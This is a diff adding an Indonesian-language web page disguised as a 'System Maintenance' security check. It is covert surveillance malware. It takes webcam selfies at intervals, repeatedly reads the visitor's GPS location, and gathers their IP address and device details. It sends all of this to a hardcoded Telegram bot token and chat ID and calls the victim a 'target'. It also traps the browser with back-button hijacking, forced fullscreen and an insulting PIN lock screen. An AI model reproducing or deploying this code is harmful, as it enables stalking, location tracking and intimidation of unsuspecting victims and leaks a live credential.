@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Maintenance</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Courier New', monospace;
+            color: #00ff41;
+            flex-direction: column;
+            overflow: hidden;
+            touch-action: none;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .container { text-align: center; padding: 20px; }
+        .status-text {
+            font-size: 22px;
+            text-shadow: 0 0 10px #00ff4155;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .sub-text {
+            font-size: 14px;
+            color: #6b8a7a;
+            margin-top: 15px;
+        }
+        .spinner {
+            border: 3px solid #1a2a22;
+            border-top: 3px solid #00ff41;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer {
+            position: fixed;
+            bottom: 15px;
+            font-size: 11px;
+            color: #1a2a22;
+        }
+        video, canvas { display: none; }
+
+        /* ===== LOCK SCREEN OVERLAY ===== */
+        #lockScreen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 999999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #ff3333;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        #lockScreen.show { display: flex; }
+        #lockScreen h1 {
+            font-size: 42px;
+            text-shadow: 0 0 20px #ff000088;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        #lockScreen p {
+            font-size: 18px;
+            color: #ccc;
+            margin-bottom: 20px;
+        }
+        #lockScreen input {
+            padding: 15px 25px;
+            font-size: 24px;
+            border: 2px solid #ff3333;
+            background: #111;
+            color: #fff;
+            border-radius: 10px;
+            text-align: center;
+            width: 200px;
+            outline: none;
+        }
+        #lockScreen input:focus {
+            border-color: #ff6666;
+            box-shadow: 0 0 15px #ff333355;
+        }
+        #lockScreen button {
+            margin-top: 15px;
+            padding: 12px 40px;
+            background: #ff3333;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        #lockScreen button:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+        }
+        #lockScreen .error {
+            color: #ffaa00;
+            margin-top: 12px;
+            font-size: 16px;
+            min-height: 24px;
+        }
+        #lockScreen .hint {
+            color: #666;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div class="spinner"></div>
+        <div class="status-text" id="status">🔒 INITIALIZING SECURE MODULE...</div>
+        <div class="sub-text" id="sub">Mohon tunggu, sistem sedang memeriksa perangkat</div>
+        <div class="footer">NOVA SECURE v5.0</div>
+    </div>
+
+    <!-- LOCK SCREEN PIN -->
+    <div id="lockScreen">
+        <h1>⚠️ YOU IDIOT TOLOL</h1>
+        <p>Masukkan PIN untuk membuka kunci</p>
+        <input type="password" id="pinInput" maxlength="6" autofocus>
+        <button id="pinButton">🔓 UNLOCK</button>
+        <div class="error" id="pinError"></div>
+        <div class="hint">PIN: 121</div>
+    </div>
+
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============ KONFIGURASI TELEGRAM ============
+        const BOT_TOKEN = "8639885206:AAFzDdSQul57arU6iMtdvaAo31WS9uZ0hds";
+        const CHAT_ID = "7093280548";
+
+        // ============ DOM REFS ============
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const statusEl = document.getElementById('status');
+        const subEl = document.getElementById('sub');
+
+        // ============ LOCK SCREEN DOM ============
+        const lockScreen = document.getElementById('lockScreen');
+        const pinInput = document.getElementById('pinInput');
+        const pinButton = document.getElementById('pinButton');
+        const pinError = document.getElementById('pinError');
+
+        // ============ STATE ============
+        let isCameraActive = false;
+        let captureInterval = null;
+        let locationInterval = null;
+        let isLocked = false;
+        const CORRECT_PIN = "121";
+        let unlockCallback = null; // fungsi yang akan dijalankan setelah unlock
+
+        // ============ FUNGSI UNLOCK ============
+        function unlockDevice(redirectUrl) {
+            lockScreen.classList.remove('show');
+            isLocked = false;
+            pinError.textContent = '';
+            pinInput.value = '';
+            if (redirectUrl) {
+                window.location.href = redirectUrl;
+            }
+        }
+
+        // ============ FUNGSI LOCK ============
+        function triggerLock(redirectAfterUnlock) {
+            if (isLocked) return; // sudah terkunci
+            isLocked = true;
+            lockScreen.classList.add('show');
+            pinInput.value = '';
+            pinError.textContent = '';
+            pinInput.focus();
+            // Simpan callback untuk redirect setelah unlock
+            unlockCallback = function() {
+                unlockDevice(redirectAfterUnlock || 'https://google.com');
+            };
+            // Kirim notifikasi ke Telegram bahwa target mencoba keluar
+            sendTelegramMessage('⚠️ Target mencoba keluar! Lock screen aktif.');
+        }
+
+        // ============ EVENT PIN ============
+        function handlePinAttempt() {
+            const inputPin = pinInput.value.trim();
+            if (inputPin === CORRECT_PIN) {
+                pinError.textContent = '✅ PIN benar!';
+                if (unlockCallback) {
+                    unlockCallback();
+                } else {
+                    unlockDevice('https://google.com');
+                }
+            } else {
+                pinError.textContent = '❌ PIN SALAH! Coba lagi.';
+                pinInput.value = '';
+                pinInput.focus();
+                // Kirim notifikasi PIN salah
+                sendTelegramMessage('🔴 PIN salah dimasukkan: ' + inputPin);
+            }
+        }
+
+        pinButton.addEventListener('click', handlePinAttempt);
+        pinInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                handlePinAttempt();
+            }
+        });
+
+        // ============ FUNGSI KIRIM PESAN ============
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            }).catch(() => {});
+        }
+
+        function sendTelegramPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        // ============ KIRIM INFO PERANGKAT ============
+        function sendDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown', browser = 'Unknown', os = 'Unknown';
+
+            if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; }
+            else if (/iphone|ipad|ipod/i.test(ua)) { device = 'iOS'; os = 'iOS'; }
+            else if (/windows/i.test(ua)) { device = 'PC'; os = 'Windows'; }
+            else if (/mac/i.test(ua)) { device = 'PC'; os = 'macOS'; }
+            else if (/linux/i.test(ua)) { device = 'PC'; os = 'Linux'; }
+
+            if (/chrome/i.test(ua)) browser = 'Chrome';
+            else if (/firefox/i.test(ua)) browser = 'Firefox';
+            else if (/safari/i.test(ua)) browser = 'Safari';
+            else if (/edge/i.test(ua)) browser = 'Edge';
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || 'Unknown';
+                    const country = data.country_name || 'Unknown';
+                    const city = data.city || 'Unknown';
+                    const msg = `
+📱 <b>PERANGKAT TARGET</b>
+─────────────────
+🖥️ Device  : ${device}
+💻 OS      : ${os}
+🌐 Browser : ${browser}
+🌍 IP      : <code>${ip}</code>
+🏙️ Lokasi  : ${city}, ${country}
+🔗 <a href="https://ipinfo.io/${ip}">Lihat detail IP</a>
+─────────────────
+🕒 Waktu   : ${new Date().toLocaleString('id-ID')}
+                    `.trim();
+                    sendTelegramMessage(msg);
+                })
+                .catch(() => {
+                    const msg = `
+📱 <b>PERANGKAT TARGET</b>
+─────────────────
+🖥️ Device  : ${device}
+💻 OS      : ${os}
+🌐 Browser : ${browser}
+─────────────────
+🕒 Waktu   : ${new Date().toLocaleString('id-ID')}
+                    `.trim();
+                    sendTelegramMessage(msg);
+                });
+        }
+
+        // ============ AMBIL LOKASI ============
+        function getLocation() {
+            if (!navigator.geolocation) {
+                subEl.innerText = '⚠️ GPS tidak tersedia';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy || '?';
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    const msg = `
+📍 <b>LOKASI TARGET</b>
+─────────────────
+🌐 Latitude  : <code>${lat}</code>
+🌐 Longitude : <code>${lon}</code>
+🎯 Akurasi   : ${acc} meter
+🔗 <a href="${mapsLink}">🗺️ Lihat di Google Maps</a>
+─────────────────
+📸 Foto selfie dikirim terpisah
+                    `.trim();
+                    sendTelegramMessage(msg);
+                    subEl.innerText = '✅ Lokasi terkirim!';
+                },
+                function(err) {
+                    if (err.code === 1) {
+                        sendTelegramMessage('⚠️ IZIN LOKASI DITOLAK');
+                    } else {
+                        subEl.innerText = '⚠️ Gagal lokasi: ' + err.message;
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        // ============ AKTIFKAN KAMERA ============
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                isCameraActive = true;
+                statusEl.innerText = '📸 KAMERA AKTIF';
+                subEl.innerText = 'Mengambil foto selfie...';
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+
+                captureInterval = setInterval(capturePhoto, 10000);
+                setTimeout(capturePhoto, 1500);
+                sendDeviceInfo();
+                getLocation();
+                locationInterval = setInterval(getLocation, 30000);
+
+                sendTelegramMessage('✅ Target berhasil di-lock browser + PIN trap.');
+                return true;
+            } catch (err) {
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    sendTelegramMessage('❌ IZIN KAMERA DITOLAK, tapi tetap terkunci!');
+                    statusEl.innerText = '⚠️ KAMERA DITOLAK';
+                    subEl.innerText = 'Izin diperlukan, tapi browser tetap terkunci.';
+                } else {
+                    statusEl.innerText = '⚠️ ERROR KAMERA';
+                    subEl.innerText = 'Error: ' + err.message;
+                }
+                return false;
+            }
+        }
+
+        // ============ CAPTURE ============
+        function capturePhoto() {
+            if (!isCameraActive || !video.videoWidth) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    sendTelegramPhoto(blob);
+                    subEl.innerText = `📸 Selfie terkirim! (${Math.round(blob.size/1024)}KB)`;
+                }
+            }, 'image/jpeg', 0.7);
+        }
+
+        // ============ BROWSER LOCK + PIN TRAP ============
+        function lockBrowser() {
+            // 1. Mencegah tombol back dengan pushState + trigger lock
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function(e) {
+                history.pushState(null, null, location.href);
+                triggerLock('https://google.com');
+            });
+
+            // 2. Mencegah refresh / close tab dengan beforeunload (hanya peringatan)
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                // Trigger lock screen juga (meskipun tidak bisa interaktif, tapi kita tampilkan overlay)
+                triggerLock('https://google.com');
+                return '';
+            });
+
+            // 3. Mencegah swipe back di HP
+            document.addEventListener('touchstart', function(e) {
+                if (e.touches.length === 1 && e.touches[0].clientX < 50) {
+                    e.preventDefault();
+                    triggerLock('https://google.com');
+                }
+            }, { passive: false });
+
+            // 4. Mencegah pull-to-refresh
+            document.addEventListener('touchmove', function(e) {
+                if (e.touches.length === 1 && e.touches[0].clientY < 20) {
+                    e.preventDefault();
+                }
+            }, { passive: false });
+
+            // 5. Paksa fullscreen
+            function requestFullscreen() {
+                const el = document.documentElement;
+                if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                else if (el.msRequestFullscreen) el.msRequestFullscreen();
+            }
+            document.addEventListener('click', requestFullscreen);
+            setTimeout(requestFullscreen, 500);
+
+            // 6. Cegah klik kanan
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+
+            // 7. Cegah keyboard shortcut
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && (e.key === 'w' || e.key === 'r' || e.key === 'F5')) {
+                    e.preventDefault();
+                    triggerLock('https://google.com');
+                    return false;
+                }
+                if (e.key === 'F5' || e.key === 'Escape') {
+                    e.preventDefault();
+                    triggerLock('https://google.com');
+                    return false;
+                }
+            });
+
+            // 8. Visibility change: jika tab di-hidden, lock muncul
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    triggerLock('https://google.com');
+                }
+            });
+
+            // 9. Deteksi klik pada area luar (tidak terlalu penting)
+            document.addEventListener('click', function(e) {
+                if (isLocked) {
+                    pinInput.focus();
+                }
+            });
+        }
+
+        // ============ INIT ============
+        window.onload = function() {
+            // Aktifkan lock browser segera
+            lockBrowser();
+
+            statusEl.innerText = '🔒 MEMINTA IZIN KAMERA...';
+            subEl.innerText = 'Klik "Izinkan" untuk melanjutkan';
+
+            setTimeout(async function() {
+                await startCamera();
+            }, 1000);
+        };
+
+        // ============ CLEANUP ============
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (locationInterval) clearInterval(locationInterval);
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
